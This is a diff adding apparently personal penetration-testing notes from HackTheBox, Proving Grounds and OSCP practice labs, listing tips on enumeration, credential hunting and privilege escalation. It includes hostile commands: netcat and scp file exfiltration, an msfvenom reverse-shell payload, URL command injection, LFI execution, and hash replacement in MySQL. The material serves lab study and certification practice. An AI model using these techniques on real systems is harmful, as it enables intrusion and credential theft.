@@ -1,0 +1,74 @@
+
+	1. Always check for backup folders. Try to look for horizontal privesc.
+	2. Find user.txt --->  find . -name user.txt -exec wc -c {} \; -exec cat {} \;
+	3. Always try "History" command and "cat .bash_history"
+	4. With PHP filters -->  If config.php or db.php content not visible on web. Read that file directly from /var/www/html/db.php  --> BountyHunter HTB
+	5. Always use ssh if available or if have valid creds rather than netcat reverse shell which may be unstable. Don't have creds but reverse shell? Create SSH keys using ssh-keygen
+	6. If user does not have any ssh keys, create it using ssh-keygen command and name the id_rsa.pub as authorized_keys which is the standard name format for public key without the ssh can't recognizes it.
+	7. Before any file share use md5sum to know about data corruption if occurred.
+	8. File sharing --->  base64 copy-paste or cat filename | nc <IP> port
+	9. Always check each file in the database folder whether it is users.php , config.php or db.php
+	10. When acquired a shell and want to privesc horizontally try to use every found passwords on the new users. E.g. Passwords found before the initial access or from database file after getting the initial access.
+	11. Look for the files that contains a word config or conf or configuration irrespective of its extension.
+	12. If login through ssh is not working and if you already have the shell, try doing 'su <username>'
+	13. If private key is encrypted then crack it using john. And try the same password to login as 'su <username>'. Or SSH using that cracked password.
+	14. Always look for Database credentials in every configuration files.
+	15. Spawn python pty shell before working with mysql otherwise it will never start.
+	16. If emoji or bad characters present in hash as a salt, always cross-check base64 and directly copied hash file with md5sum.  (Previse HTB)
+	--->   select TO_BASE64(password) from accounts;        ---->(base64 to prevent corruption of emoji while copying)
+	The hash contained the symbol in it as a type of salt.
+	Original hash  --->   $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
+	Base64 hash  ---->   JDEk8J+ngmxsb2wkRFFwbWR2bmI3RWV1TzZVYXFSSXRmLg==
+	If no spaces are given in a file, md5sum may remain similar or may come out to be different.
+	17. Use scp command to transfer files from victim's computer to our attacking computer.
+	18. Mirai HTB - On Root.txt  --->  "I lost my original root.txt! I think I may have a backup on my USB stick…" That means we need to look into USB media. 
+	So, USB media are typically mounted in /media on Linux. I can also look at mount to show all the mounted drives. Commands to check it -->  mount , lsblk , df -h
+	19. If the "HomeDirs" /home is specified in any application's httpd.conf file, that means the user can access its directory from web /~username and check what is the publicly accessible directory, like in the Traverexec Box, it was public_www which was specified in its conf file. User's actual directory was /home/david/public_www
+	20. We can hop over to parent processes from child processes using -->  ps -ef  -->  Refer (Traverexec)
+	21. Check the database files (e.g.  Settings.inc.php) in the /var/www/html directory once we get a shell.
+	22. If you find a database username and password, try re-using that password for the other users with 'su' command or just SSH. Most of the times it work.
+	23. To check where the apache2 server is hosting the files, visit --->  /etc/apache2/sites-enabled
+	To get an idea about how it’s hosted (different vhost, or path, or port) by looking at the configs in /etc/apache2/sites-enabled  
+	It shows us what server name the site uses e.g. openadmin.conf and internal.openadmin.conf . Also it shows us on which port the site is running and as a which user.  (Openadmin 0xdf)
+	24. If any webserver or anything running only internally/locally on different port, try to curl it from the victim machine itself.
+	25. Once on the box, always check index.php file because sometimes we may find the hardcoded credentials there.  (Openadmin HTB)
+	26. If .git folder found after initial foothold. Perform local git enumeration using some git commands. Run -->  ls -la
+	27. After getting initial foothold, always check /opt folder
+	28. If any suspicious bash, python, php, etc. script found which is owned by our user, try to find dangerous functions in the script and search for exploits for the libraries it uses. (Editorial)
+	To check the library version in the python script  --->  pip freeze | grep -i git
+	29. To list all directories and files in them at once -->  find . -type f -ls
+	30. Once get a shell, cat the files such as login.php, index.php, validate.php, etc. Because sometimes we can find hardcoded password inside those files. BTW config files are must.
+	31. To list subdirectories recursively --->  ls -R
+	32. If any python (.py) file found on the victim system - For python Library Hijacking refer Wonderland THM (TryHackMe). Horizontal or Vertical Privesc.
+	33. If mysql can't be accessed remotely, try logging in locally once you get a shell.
+	34. When you do port forwarding, try checking it using netcat whether we can connect to that forwarded port or not. I connected using netcat and once directly got a bind shell on my netcat. And learned that we can connect to that bind port only once. Otherwise need to reverse the machine. (Secura)
+	35. I found three backups files, but first two of them didn't open but third one was password protected. Used zip2john and looked into configuration files. Found user's password.
+	36. I refreshed the concept of Bind shell on this machine. Because my reverse shells were not working and the victim machine was not getting connected to my VM, I needed to restart the VPN and the victim machine itself but unfortunately I didn't do that. So searched for other techniques and medhat told me to use bind shell. It worked. I used python one there. This was execeptional which was not needed but tried it.  (Ochima)
+	37. If username "jack" doesn't work, try "Jack" and vice versa. Always make sure to use small and capital letters both because sometimes applications can be case-sensitives. (OSCP-C)
+	38. If port 25 - SMTP is open and feels useless during initial access, but do check the /var/mail or /var/spool/mail folder once we get an initial access.  (Scrutiny PG)
+	The mail directory will be /var/spool/mail. First give chmod permissions to the whole directory to see what can you read.
+	Read all the mails carefully.
+	39. Check if you can upload any file on the ftp server and find out how can you execute it later.
+	If pub directory is present in the ftp and have writable permissions, upload a file. It's working directory is /var/ftp/pub  (Sybaris PG)
+	40. If we have a remote access to the mysql database, and if need to login to any website, we can see the creds stored inside that database.  (BitForge PG)
+	If those creds hashes cannot be cracked, we can just change it to our hash in mysql and then login.
+	If the passwords have some salt in use before hashing, we need to look for that web application online, like either we can download it or we can look for its open source GitHub page.
+	41. Linux -- Found Database username and password in the environment variables.  For windows, check environment variables too.
+	42. Always look in c:\ folder and check if any unknown folder is found. Here, Infrastructure.pdf was found in the c:\FTP folder
+	43. Don't ignore anything from the URL. I first neglected the Question mark at the end of the first link. But after looking at the walkthrough, came to know that we can put commands after the '?' and execute it.  E.g.  http://nickel/?whoami
+	44. On my kali VM that port 80 was not loading. But from the machine that I could see that port 80 was accessible from all interfaces (0.0.0.0). Maybe some firewall was blocking the outbound traffic.
+	45. I realized that if the port is not accessible remotely and if we have a shell, we can also try it locally.   --->   http://localhost/?whoami   (Nickel PG)
+	46. Always check each table in MySQL database.
+	47. Check each file in config folder  -->  /filemanager/config/.htusers.php
+	48. SMTP (mail) port 25 open locally?  Check /var/mail/<username>  --->  valuable info Or maybe passwords
+	49. Wordpress config file  ->  wp-config.php
+	50. If chisel is not working for port forwarding try SSH -L port forwarding  -->  ssh commander@192.168.239.105 -L 5901:127.0.0.1:5901
+	51. Check writable files --->   find / -writable -type d -prune -o -name /home/chloe -prune -o -name /var/lib/gitea 2>/dev/null
+	52. We cannot transfer binaries (linpeas, pspy) on low privilege reverse shell. Create SSH keys and login, then it should work.
+	53. Linux binary file  --->   msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.118.3 LPORT=21
+	54. Googling: Search for "medium zabbix execute" (Add some keywords in it like shell, execute, reverse shell, etc.)  Medium is a good platform for that.
+	55. LFI can also be used to execute the files. It may not get executed from the /tmp directory but from the other directories such as /run/redis , etc.
+	Example:  http://<IP>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/run/redis/shell.php
+	56. FileZilla (FTP client) passwords are stored in the User's AppData directory in a file named recentservers.xml
+	
+	
